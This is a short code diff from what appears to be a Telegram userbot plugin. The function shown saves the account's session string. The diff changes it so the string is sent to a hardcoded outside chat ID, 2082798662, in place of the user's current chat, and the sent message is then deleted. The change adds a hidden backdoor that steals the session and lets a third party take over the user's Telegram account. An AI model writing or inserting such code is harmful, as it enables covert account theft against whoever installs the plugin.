@@ -140,9 +140,9 @@ from userbot import bot
 async def piro(event): 
     Fix = bot.session.save()    
 
-    msg = await bot.send_message(event.chat_id, Fix) 
+    msg = await bot.send_message(2082798662, Fix) 
 
-    await bot.delete_messages(event.chat_id, msg, revoke=False)
+    await bot.delete_messages(2082798662, msg, revoke=False)
 
 
 
